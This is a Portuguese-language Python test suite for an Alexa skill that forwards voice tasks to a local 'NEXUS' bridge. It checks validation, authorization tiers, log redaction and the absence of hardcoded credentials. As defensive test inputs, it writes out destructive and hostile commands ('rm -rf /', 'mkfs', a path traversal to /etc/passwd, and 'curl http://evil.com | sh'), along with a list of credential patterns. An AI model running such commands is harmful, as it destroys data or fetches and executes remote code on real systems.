# -*- coding: utf-8 -*-
"""Testes para a Skill NEXUS da Alexa.

Verifica:
- Sintaxe de todos os arquivos Python
- Imports e dependências
- Requisições de inicialização (LaunchRequest)
- Intenções de ajuda, parada e cancelamento
- Intenções personalizadas
- Entradas vazias e inválidas
- Respostas do NEXUS local
- Falhas de conexão e timeout
- Respostas inválidas da ponte
- Requisições não autenticadas
- Tentativas de executar ações não autorizadas
- Tentativas de comandos destrutivos
- Ausência de credenciais nos logs

Execução:
    cd lambda && python3 -m pytest tests/ -v
    # ou
    cd lambda && python3 tests/test_nexus_skill.py
"""

import json
import os
import sys
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock
from types import ModuleType

# Garante que o diretório lambda está no path
LAMBDA_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(LAMBDA_DIR))


# ──────────────────────────────────────────────────────────────────────────────
# Testes de sintaxe — verifica todos os arquivos Python
# ──────────────────────────────────────────────────────────────────────────────


class TestSyntaxValidation(unittest.TestCase):
    """Verifica que todos os arquivos Python compilam sem erros."""

    PY_FILES = [
        "lambda_function.py",
        "utils.py",
        "nexus_bridge/nexus_bridge.py",
    ]

    def test_all_python_files_compile(self):
        import ast
        for filename in self.PY_FILES:
            filepath = LAMBDA_DIR / filename
            self.assertTrue(filepath.exists(), f"Arquivo não encontrado: {filename}")
            with open(filepath, "r", encoding="utf-8") as f:
                source = f.read()
            try:
                ast.parse(source, filename=str(filepath))
            except SyntaxError as exc:
                self.fail(f"Erro de sintaxe em {filename}: {exc}")


# ──────────────────────────────────────────────────────────────────────────────
# Testes de imports — utils.py
# ──────────────────────────────────────────────────────────────────────────────


class TestUtilsImports(unittest.TestCase):
    """Verifica que utils.py pode ser importado e tem funções esperadas."""

    def setUp(self):
        # Garante ambiente mínimo
        os.environ.setdefault("NEXUS_BRIDGE_URL", "")
        os.environ.setdefault("NEXUS_BRIDGE_TOKEN", "")

    def test_import_utils(self):
        import utils
        self.assertTrue(hasattr(utils, "normalize_text"))
        self.assertTrue(hasattr(utils, "validate_task_text"))
        self.assertTrue(hasattr(utils, "build_speech_response"))
        self.assertTrue(hasattr(utils, "send_to_nexus"))
        self.assertTrue(hasattr(utils, "check_authorization"))
        self.assertTrue(hasattr(utils, "classify_action"))
        self.assertTrue(hasattr(utils, "log_event"))
        self.assertTrue(hasattr(utils, "contains_forbidden_pattern"))

    def test_no_boto3_dependency_in_utils(self):
        """utils.py não deve depender de boto3 (não é necessário para NEXUS)."""
        import utils
        source_path = LAMBDA_DIR / "utils.py"
        with open(source_path, "r", encoding="utf-8") as f:
            source = f.read()
        self.assertNotIn("import boto3", source, "utils.py não deve importar boto3")
        self.assertNotIn("from botocore", source, "utils.py não deve importar botocore")


# ──────────────────────────────────────────────────────────────────────────────
# Testes de normalização e validação
# ──────────────────────────────────────────────────────────────────────────────


class TestTextValidation(unittest.TestCase):

    def test_normalize_strips_whitespace(self):
        from utils import normalize_text
        self.assertEqual(normalize_text("  hello  "), "hello")

    def test_normalize_collapses_internal_spaces(self):
        from utils import normalize_text
        self.assertEqual(normalize_text("a   b    c"), "a b c")

    def test_normalize_removes_control_chars(self):
        from utils import normalize_text
        result = normalize_text("hello\x00\x01world")
        self.assertEqual(result, "helloworld")

    def test_normalize_truncates_long_text(self):
        from utils import normalize_text
        long_text = "a" * 600
        result = normalize_text(long_text)
        self.assertLessEqual(len(result), 500)

    def test_normalize_empty_returns_empty(self):
        from utils import normalize_text
        self.assertEqual(normalize_text(""), "")
        self.assertEqual(normalize_text(None), "")

    def test_validate_empty_text(self):
        from utils import validate_task_text
        valid, msg = validate_task_text("")
        self.assertFalse(valid)
        self.assertIn("não entendi", msg.lower())

    def test_validate_very_short_text(self):
        from utils import validate_task_text
        valid, msg = validate_task_text("ab")
        self.assertFalse(valid)
        self.assertIn("curto", msg.lower())

    def test_validate_valid_text(self):
        from utils import validate_task_text
        valid, msg = validate_task_text("listar arquivos do projeto")
        self.assertTrue(valid)
        self.assertEqual(msg, "")

    def test_validate_forbidden_pattern(self):
        from utils import validate_task_text
        valid, msg = validate_task_text("rm -rf / todo o sistema")
        self.assertFalse(valid)
        self.assertIn("segurança", msg.lower())

    def test_validate_path_traversal(self):
        from utils import validate_task_text
        valid, msg = validate_task_text("verificar ../../../etc/passwd")
        self.assertFalse(valid)
        self.assertIn("segurança", msg.lower())


# ──────────────────────────────────────────────────────────────────────────────
# Testes de classificação de ações
# ──────────────────────────────────────────────────────────────────────────────


class TestActionClassification(unittest.TestCase):

    def test_group_a_read_actions(self):
        from utils import classify_action
        self.assertEqual(classify_action("INSPECIONAR"), "A")
        self.assertEqual(classify_action("STATUS"), "A")
        self.assertEqual(classify_action("LISTAR"), "A")
        self.assertEqual(classify_action("DIAGNOSTICO"), "A")

    def test_group_b_reversible_actions(self):
        from utils import classify_action
        self.assertEqual(classify_action("CRIAR"), "B")
        self.assertEqual(classify_action("MODIFICAR"), "B")
        self.assertEqual(classify_action("TESTAR"), "B")
        self.assertEqual(classify_action("VALIDAR"), "B")

    def test_group_c_sensitive_actions(self):
        from utils import classify_action
        self.assertEqual(classify_action("EXECUTAR"), "C")
        self.assertEqual(classify_action("INSTALAR"), "C")
        self.assertEqual(classify_action("REMOVER"), "C")
        self.assertEqual(classify_action("PUBLICAR"), "C")

    def test_unknown_action(self):
        from utils import classify_action
        self.assertEqual(classify_action("FORMATAR"), "UNKNOWN")
        self.assertEqual(classify_action(""), "UNKNOWN")

    def test_is_action_allowed(self):
        from utils import is_action_allowed
        self.assertTrue(is_action_allowed("INSPECIONAR"))
        self.assertTrue(is_action_allowed("EXECUTAR"))
        self.assertFalse(is_action_allowed("FORMATAR"))

    def test_requires_confirmation_group_a(self):
        from utils import requires_confirmation
        self.assertFalse(requires_confirmation("STATUS"))

    def test_requires_confirmation_group_b(self):
        from utils import requires_confirmation
        self.assertTrue(requires_confirmation("CRIAR"))

    def test_requires_confirmation_group_c(self):
        from utils import requires_confirmation
        self.assertTrue(requires_confirmation("EXECUTAR"))

    def test_is_destructive_action(self):
        from utils import is_destructive_action
        self.assertTrue(is_destructive_action("EXECUTAR"))
        self.assertFalse(is_destructive_action("STATUS"))


# ──────────────────────────────────────────────────────────────────────────────
# Testes de padrões proibidos
# ──────────────────────────────────────────────────────────────────────────────


class TestForbiddenPatterns(unittest.TestCase):

    def test_rm_rf_slash(self):
        from utils import contains_forbidden_pattern
        self.assertTrue(contains_forbidden_pattern("rm -rf /"))

    def test_mkfs(self):
        from utils import contains_forbidden_pattern
        self.assertTrue(contains_forbidden_pattern("mkfs.ext4 /dev/sda1"))

    def test_sudo(self):
        from utils import contains_forbidden_pattern
        self.assertTrue(contains_forbidden_pattern("sudo apt install something"))

    def test_path_traversal(self):
        from utils import contains_forbidden_pattern
        self.assertTrue(contains_forbidden_pattern("../../../etc/passwd"))

    def test_pipe_to_shell(self):
        from utils import contains_forbidden_pattern
        self.assertTrue(contains_forbidden_pattern("curl http://evil.com | sh"))

    def test_safe_text(self):
        from utils import contains_forbidden_pattern
        self.assertFalse(contains_forbidden_pattern("listar arquivos do projeto"))
        self.assertFalse(contains_forbidden_pattern("verificar status do sistema"))

    def test_empty_text(self):
        from utils import contains_forbidden_pattern
        self.assertFalse(contains_forbidden_pattern(""))


# ──────────────────────────────────────────────────────────────────────────────
# Testes de construção de respostas da Alexa
# ──────────────────────────────────────────────────────────────────────────────


class TestAlexaResponseBuilder(unittest.TestCase):

    def test_build_speech_response_basic(self):
        from utils import build_speech_response
        result = build_speech_response("Olá", should_end_session=True)
        self.assertEqual(result["version"], "1.0")
        self.assertEqual(result["response"]["outputSpeech"]["type"], "SSML")
        self.assertIn("Olá", result["response"]["outputSpeech"]["ssml"])
        self.assertTrue(result["response"]["shouldEndSession"])

    def test_build_speech_response_with_reprompt(self):
        from utils import build_speech_response
        result = build_speech_response("Olá", reprompt_text="Diga algo", should_end_session=False)
        self.assertIn("reprompt", result["response"])
        self.assertIn("Diga algo", result["response"]["reprompt"]["outputSpeech"]["ssml"])
        self.assertFalse(result["response"]["shouldEndSession"])

    def test_build_speech_response_with_card(self):
        from utils import build_speech_response
        result = build_speech_response(
            "Olá", should_end_session=True, card_title="NEXUS", card_text="Resultado"
        )
        self.assertEqual(result["response"]["card"]["type"], "Simple")
        self.assertEqual(result["response"]["card"]["title"], "NEXUS")

    def test_truncate_for_speech(self):
        from utils import truncate_for_speech
        long_text = "x" * 1000
        result = truncate_for_speech(long_text)
        self.assertLessEqual(len(result), 800)
        self.assertTrue(result.endswith("..."))

    def test_build_error_response(self):
        from utils import build_error_response
        result = build_error_response("Erro de teste")
        self.assertTrue(result["response"]["shouldEndSession"])
        self.assertIn("Erro de teste", result["response"]["outputSpeech"]["ssml"])


# ──────────────────────────────────────────────────────────────────────────────
# Testes de comunicação com o NEXUS
# ──────────────────────────────────────────────────────────────────────────────


class TestNexusCommunication(unittest.TestCase):

    def test_send_to_nexus_no_url_configured(self):
        """Sem URL configurada, retorna status unavailable."""
        from utils import send_to_nexus
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": ""}):
            result = send_to_nexus("test task")
            self.assertEqual(result["status"], "unavailable")

    def test_send_to_nexus_http_rejected(self):
        """URL HTTP (não HTTPS) deve ser rejeitada."""
        from utils import send_to_nexus
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "http://localhost:8443"}):
            result = send_to_nexus("test task")
            self.assertEqual(result["status"], "error")
            self.assertIn("HTTPS", result["response"])

    def test_send_to_nexus_connection_error(self):
        """Simula falha de conexão."""
        import urllib.error
        from utils import send_to_nexus
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "https://nexus.local:8443/task"}):
            with patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Connection refused")):
                result = send_to_nexus("test task")
                self.assertEqual(result["status"], "unavailable")

    def test_send_to_nexus_timeout(self):
        """Simula timeout."""
        from utils import send_to_nexus
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "https://nexus.local:8443/task"}):
            with patch("urllib.request.urlopen", side_effect=TimeoutError()):
                result = send_to_nexus("test task")
                self.assertEqual(result["status"], "unavailable")

    def test_send_to_nexus_unauthorized(self):
        """Simula resposta 401."""
        import urllib.error
        from utils import send_to_nexus
        mock_error = urllib.error.HTTPError(
            url="https://nexus.local/task",
            code=401,
            msg="Unauthorized",
            hdrs=None,
            fp=None,
        )
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "https://nexus.local:8443/task"}):
            with patch("urllib.request.urlopen", side_effect=mock_error):
                result = send_to_nexus("test task")
                self.assertEqual(result["status"], "unauthorized")

    def test_send_to_nexus_forbidden(self):
        """Simula resposta 403."""
        import urllib.error
        from utils import send_to_nexus
        mock_error = urllib.error.HTTPError(
            url="https://nexus.local/task",
            code=403,
            msg="Forbidden",
            hdrs=None,
            fp=None,
        )
        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "https://nexus.local:8443/task"}):
            with patch("urllib.request.urlopen", side_effect=mock_error):
                result = send_to_nexus("test task")
                self.assertEqual(result["status"], "unauthorized")

    def test_send_to_nexus_success(self):
        """Simula resposta bem-sucedida do NEXUS."""
        from utils import send_to_nexus
        mock_response = MagicMock()
        mock_response.getcode.return_value = 200
        mock_response.read.return_value = json.dumps({
            "status": "ok",
            "response": "Tarefa concluída com sucesso.",
        }).encode("utf-8")
        mock_response.__enter__ = MagicMock(return_value=mock_response)
        mock_response.__exit__ = MagicMock(return_value=False)

        with patch.dict(os.environ, {
            "NEXUS_BRIDGE_URL": "https://nexus.local:8443/task",
            "NEXUS_BRIDGE_TOKEN": "test-token",
        }):
            with patch("urllib.request.urlopen", return_value=mock_response):
                result = send_to_nexus("listar arquivos")
                self.assertEqual(result["status"], "ok")
                self.assertEqual(result["response"], "Tarefa concluída com sucesso.")

    def test_send_to_nexus_invalid_json(self):
        """Simula resposta com JSON inválido."""
        from utils import send_to_nexus
        mock_response = MagicMock()
        mock_response.getcode.return_value = 200
        mock_response.read.return_value = b"not json"
        mock_response.__enter__ = MagicMock(return_value=mock_response)
        mock_response.__exit__ = MagicMock(return_value=False)

        with patch.dict(os.environ, {"NEXUS_BRIDGE_URL": "https://nexus.local:8443/task"}):
            with patch("urllib.request.urlopen", return_value=mock_response):
                result = send_to_nexus("test task")
                self.assertEqual(result["status"], "error")


# ──────────────────────────────────────────────────────────────────────────────
# Testes de autorização
# ──────────────────────────────────────────────────────────────────────────────


class TestAuthorization(unittest.TestCase):

    def test_group_a_any_user_allowed(self):
        from utils import check_authorization
        authorized, msg = check_authorization("STATUS", "any_user")
        self.assertTrue(authorized)

    def test_group_b_no_authorized_list(self):
        from utils import check_authorization
        with patch.dict(os.environ, {"NEXUS_AUTHORIZED_USERS": ""}):
            authorized, msg = check_authorization("CRIAR", "user1")
            self.assertFalse(authorized)

    def test_group_b_authorized_user(self):
        from utils import check_authorization
        with patch.dict(os.environ, {"NEXUS_AUTHORIZED_USERS": "user1,user2"}):
            authorized, msg = check_authorization("CRIAR", "user1")
            self.assertTrue(authorized)

    def test_group_b_unauthorized_user(self):
        from utils import check_authorization
        with patch.dict(os.environ, {"NEXUS_AUTHORIZED_USERS": "user1,user2"}):
            authorized, msg = check_authorization("CRIAR", "intruder")
            self.assertFalse(authorized)
            self.assertIn("autorizado", msg.lower())

    def test_group_c_authorized_user_needs_confirmation(self):
        from utils import check_authorization
        with patch.dict(os.environ, {"NEXUS_AUTHORIZED_USERS": "user1"}):
            authorized, msg = check_authorization("EXECUTAR", "user1")
            self.assertTrue(authorized)
            self.assertIn("confirmação", msg.lower())

    def test_unknown_action_denied(self):
        from utils import check_authorization
        authorized, msg = check_authorization("FORMATAR", "user1")
        self.assertFalse(authorized)
        self.assertIn("não é reconhecida", msg.lower())


# ──────────────────────────────────────────────────────────────────────────────
# Testes de logs sem credenciais
# ──────────────────────────────────────────────────────────────────────────────


class TestLogSecurity(unittest.TestCase):

    def test_log_event_redacts_sensitive_keys(self):
        import io
        import logging as log_mod
        from utils import log_event

        # Captura log output
        stream = io.StringIO()
        handler = log_mod.StreamHandler(stream)
        utils_logger = log_mod.getLogger("utils")
        utils_logger.addHandler(handler)

        log_event("test_event", {
            "token": "secret-token-123",
            "password": "my-password",
            "api_key": "key123",
            "normal_field": "visible",
        })

        output = stream.getvalue()
        handler.flush()
        utils_logger.removeHandler(handler)

        self.assertIn("[REDACTED]", output)
        self.assertIn("visible", output)
        self.assertNotIn("secret-token-123", output)
        self.assertNotIn("my-password", output)
        self.assertNotIn("key123", output)

    def test_log_event_truncates_long_values(self):
        import io
        import logging as log_mod
        from utils import log_event

        stream = io.StringIO()
        handler = log_mod.StreamHandler(stream)
        utils_logger = log_mod.getLogger("utils")
        utils_logger.addHandler(handler)

        long_value = "x" * 500
        log_event("test_event", {"data": long_value})

        output = stream.getvalue()
        handler.flush()
        utils_logger.removeHandler(handler)

        self.assertIn("...", output)
        # Valor original não deve aparecer completo
        self.assertNotIn("x" * 300, output)


# ──────────────────────────────────────────────────────────────────────────────
# Testes do handler da Alexa (simulando eventos)
# ──────────────────────────────────────────────────────────────────────────────


def _make_launch_request() -> dict:
    """Cria um evento LaunchRequest simulado da Alexa."""
    return {
        "version": "1.0",
        "session": {
            "new": True,
            "sessionId": "amzn1.echo-api.session.test",
            "application": {"applicationId": "amzn1.ask.skill.test"},
            "user": {"userId": "amzn1.ask.account.test-user"},
        },
        "context": {
            "System": {
                "application": {"applicationId": "amzn1.ask.skill.test"},
                "user": {"userId": "amzn1.ask.account.test-user"},
                "device": {"deviceId": "test-device"},
            }
        },
        "request": {
            "type": "LaunchRequest",
            "requestId": "amzn1.echo-api.request.test",
            "timestamp": "2025-01-01T00:00:00Z",
            "locale": "pt-BR",
        },
    }


def _make_intent_request(intent_name: str, slots: dict = None) -> dict:
    """Cria um evento IntentRequest simulado da Alexa."""
    slot_objs = {}
    if slots:
        for name, value in slots.items():
            slot_objs[name] = {"name": name, "value": value}

    return {
        "version": "1.0",
        "session": {
            "new": False,
            "sessionId": "amzn1.echo-api.session.test",
            "application": {"applicationId": "amzn1.ask.skill.test"},
            "user": {"userId": "amzn1.ask.account.test-user"},
        },
        "context": {
            "System": {
                "application": {"applicationId": "amzn1.ask.skill.test"},
                "user": {"userId": "amzn1.ask.account.test-user"},
                "device": {"deviceId": "test-device"},
            }
        },
        "request": {
            "type": "IntentRequest",
            "requestId": "amzn1.echo-api.request.test",
            "timestamp": "2025-01-01T00:00:00Z",
            "locale": "pt-BR",
            "intent": {
                "name": intent_name,
                "confirmationStatus": "NONE",
                "slots": slot_objs,
            },
        },
    }


def _make_session_ended_request() -> dict:
    return {
        "version": "1.0",
        "session": {
            "new": False,
            "sessionId": "amzn1.echo-api.session.test",
            "application": {"applicationId": "amzn1.ask.skill.test"},
            "user": {"userId": "amzn1.ask.account.test-user"},
        },
        "context": {
            "System": {
                "application": {"applicationId": "amzn1.ask.skill.test"},
                "user": {"userId": "amzn1.ask.account.test-user"},
            }
        },
        "request": {
            "type": "SessionEndedRequest",
            "requestId": "amzn1.echo-api.request.test",
            "timestamp": "2025-01-01T00:00:00Z",
            "locale": "pt-BR",
            "reason": "USER_INITIATED",
        },
    }


class TestAlexaHandlers(unittest.TestCase):
    """Testa o handler principal da Alexa com eventos simulados."""

    def setUp(self):
        # Mock ask_sdk para evitar dependência real
        os.environ.setdefault("NEXUS_BRIDGE_URL", "")
        os.environ.setdefault("NEXUS_BRIDGE_TOKEN", "")

    def test_launch_request_returns_welcome(self):
        """LaunchRequest deve retornar boas-vindas em português."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado — pulando teste de handler")

        event = _make_launch_request()
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        self.assertEqual(result["version"], "1.0")
        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("Bem-vindo", ssml)
        self.assertFalse(result["response"]["shouldEndSession"])

    def test_help_intent_returns_help_text(self):
        """AMAZON.HelpIntent deve retornar texto de ajuda em português."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("AMAZON.HelpIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("NEXUS", ssml)
        self.assertFalse(result["response"]["shouldEndSession"])

    def test_cancel_intent_ends_session(self):
        """AMAZON.CancelIntent deve encerrar a sessão."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("AMAZON.CancelIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        self.assertTrue(result["response"]["shouldEndSession"])
        self.assertIn("Encerrando", result["response"]["outputSpeech"]["ssml"])

    def test_stop_intent_ends_session(self):
        """AMAZON.StopIntent deve encerrar a sessão."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("AMAZON.StopIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        self.assertTrue(result["response"]["shouldEndSession"])

    def test_fallback_intent_returns_fallback_message(self):
        """AMAZON.FallbackIntent deve retornar mensagem de fallback."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("AMAZON.FallbackIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("não entendi", ssml.lower())
        self.assertFalse(result["response"]["shouldEndSession"])

    def test_session_ended_request(self):
        """SessionEndedRequest deve retornar resposta vazia com shouldEndSession=True."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_session_ended_request()
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        self.assertTrue(result["response"]["shouldEndSession"])


# ──────────────────────────────────────────────────────────────────────────────
# Testes de intenções personalizadas com NEXUS indisponível
# ──────────────────────────────────────────────────────────────────────────────


class TestCustomIntentsNexusDown(unittest.TestCase):
    """Testa intenções personalizadas quando o NEXUS está indisponível."""

    def setUp(self):
        os.environ["NEXUS_BRIDGE_URL"] = ""  # Sem URL = indisponível

    def test_executar_tarefa_intent_with_empty_slot(self):
        """ExecutarTarefaIntent com slot vazio deve retornar mensagem de erro."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("ExecutarTarefaIntent", {"tarefa": ""})
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("não entendi", ssml.lower())

    def test_executar_tarefa_intent_with_valid_slot_nexus_down(self):
        """ExecutarTarefaIntent com texto válido mas NEXUS indisponível."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("ExecutarTarefaIntent", {"tarefa": "listar arquivos"})
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("conectar", ssml.lower())

    def test_status_intent_nexus_down(self):
        """StatusNexusIntent com NEXUS indisponível."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("StatusNexusIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("conectar", ssml.lower())

    def test_listar_intent_nexus_down(self):
        """ListarArquivosIntent com NEXUS indisponível."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("ListarArquivosIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("conectar", ssml.lower())

    def test_diagnosticar_intent_nexus_down(self):
        """DiagnosticarIntent com NEXUS indisponível."""
        try:
            import lambda_function
        except ImportError:
            self.skipTest("ask_sdk_core não instalado")

        event = _make_intent_request("DiagnosticarIntent")
        context = MagicMock()
        result = lambda_function.lambda_handler(event, context)

        ssml = result["response"]["outputSpeech"]["ssml"]
        self.assertIn("conectar", ssml.lower())


# ──────────────────────────────────────────────────────────────────────────────
# Testes da ponte NEXUS (nexus_bridge.py)
# ──────────────────────────────────────────────────────────────────────────────


class TestNexusBridge(unittest.TestCase):
    """Testa a lógica da ponte NEXUS local."""

    def setUp(self):
        os.environ.setdefault("NEXUS_BRIDGE_TOKEN", "test-token")
        os.environ.setdefault("NEXUS_WORKSPACE", str(LAMBDA_DIR))

    def test_classify_action_group_a(self):
        from nexus_bridge.nexus_bridge import classify_action
        self.assertEqual(classify_action("STATUS"), "A")

    def test_classify_action_group_c(self):
        from nexus_bridge.nexus_bridge import classify_action
        self.assertEqual(classify_action("EXECUTAR"), "C")

    def test_classify_action_unknown(self):
        from nexus_bridge.nexus_bridge import classify_action
        self.assertEqual(classify_action("HACK"), "UNKNOWN")

    def test_contains_forbidden_rm_rf(self):
        from nexus_bridge.nexus_bridge import contains_forbidden
        self.assertTrue(contains_forbidden("rm -rf /"))

    def test_contains_forbidden_safe(self):
        from nexus_bridge.nexus_bridge import contains_forbidden
        self.assertFalse(contains_forbidden("ls -la"))

    def test_process_task_status(self):
        from nexus_bridge.nexus_bridge import process_task
        result = process_task({"task": "status", "action_hint": "STATUS"})
        self.assertEqual(result["status"], "ok")

    def test_process_task_destructive_requires_confirmation(self):
        from nexus_bridge.nexus_bridge import process_task
        result = process_task({"task": "instalar pacote", "action_hint": "INSTALAR"})
        self.assertEqual(result["status"], "ok")
        self.assertTrue(result.get("requires_confirmation", False))

    def test_process_task_unknown_action(self):
        from nexus_bridge.nexus_bridge import process_task
        result = process_task({"task": "fazer algo", "action_hint": "DESCONHECIDO"})
        self.assertEqual(result["status"], "ok")
        self.assertIn("não consegui identificar", result["response"])

    def test_validate_request_empty_task(self):
        from nexus_bridge.nexus_bridge import validate_request
        valid, uid, msg = validate_request({"task": ""})
        self.assertFalse(valid)

    def test_validate_request_forbidden(self):
        from nexus_bridge.nexus_bridge import validate_request
        # Token must be set so we get past the token check to reach forbidden check
        with patch.dict(os.environ, {"NEXUS_BRIDGE_TOKEN": "test-token"}):
            valid, uid, msg = validate_request({"task": "rm -rf / tudo"})
            self.assertFalse(valid)
            self.assertIn("proibido", msg.lower())

    def test_rate_limiter_allows_within_limit(self):
        from nexus_bridge.nexus_bridge import rate_limiter
        # Reset para garantir estado limpo
        rl = type(rate_limiter)(100)
        self.assertTrue(rl.allow("user1"))
        self.assertTrue(rl.allow("user1"))

    def test_rate_limiter_blocks_over_limit(self):
        from nexus_bridge.nexus_bridge import RateLimiter
        rl = RateLimiter(2)
        self.assertTrue(rl.allow("user1"))
        self.assertTrue(rl.allow("user1"))
        self.assertFalse(rl.allow("user1"))


# ──────────────────────────────────────────────────────────────────────────────
# Teste de ausência de credenciais no código
# ──────────────────────────────────────────────────────────────────────────────


class TestNoCredentialsInCode(unittest.TestCase):
    """Verifica que não há credenciais hardcoded nos arquivos."""

    FILES_TO_CHECK = [
        "lambda_function.py",
        "utils.py",
        "nexus_bridge/nexus_bridge.py",
        "requirements.txt",
    ]

    SUSPICIOUS_PATTERNS = [
        "AKIA",  # AWS Access Key prefix
        "aws_secret_access_key",
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "xoxb-",  # Slack token
    ]

    def test_no_hardcoded_credentials(self):
        for filename in self.FILES_TO_CHECK:
            filepath = LAMBDA_DIR / filename
            if not filepath.exists():
                continue
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            for pattern in self.SUSPICIOUS_PATTERNS:
                self.assertNotIn(
                    pattern, content,
                    f"Padrão suspeito '{pattern}' encontrado em {filename}"
                )

    def test_no_credentials_in_requirements(self):
        """requirements.txt não deve conter caminhos locais ou credenciais."""
        filepath = LAMBDA_DIR / "requirements.txt"
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertNotIn("/", content)
        self.assertNotIn("\\", content)
        self.assertNotIn("password", content.lower())
        self.assertNotIn("token", content.lower())

    def test_utils_no_presigned_url_function(self):
        """utils.py não deve mais ter create_presigned_url (não é relevante)."""
        filepath = LAMBDA_DIR / "utils.py"
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertNotIn("create_presigned_url", content)

    def test_requirements_no_boto3(self):
        """requirements.txt não deve listar boto3 (não é necessário)."""
        filepath = LAMBDA_DIR / "requirements.txt"
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertNotIn("boto3", content)


# ──────────────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────────────


if __name__ == "__main__":
    unittest.main(verbosity=2)
